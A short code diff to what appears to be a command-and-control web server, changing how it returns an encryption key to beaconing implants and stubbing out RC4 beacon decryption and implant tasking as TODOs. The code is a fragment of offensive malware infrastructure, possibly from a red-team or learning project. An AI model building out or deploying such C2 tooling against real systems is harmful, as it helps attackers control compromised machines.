@@ -127,7 +127,8 @@ class WebServer(object):
                                            time,
                                            encryption_key))
 
-            return encryption_key
+            # returns base64 encoded encryption key in the http response
+            return base64.b64encode(encryption_key.encode())
 
         # else rc4 beacon
         else:
@@ -147,8 +148,8 @@ class WebServer(object):
                         print("successful decryption using key: " + row[0])
                         print(potentially_decrypted)
 
-                    # DEBUGGING
-                    else:
-                        print("unsuccessful decryption :(")
+                        # TO DO: decode json
+
+                        # TO DO: check for tasking for the beaconing implant
 
             return "rc4 beacon"
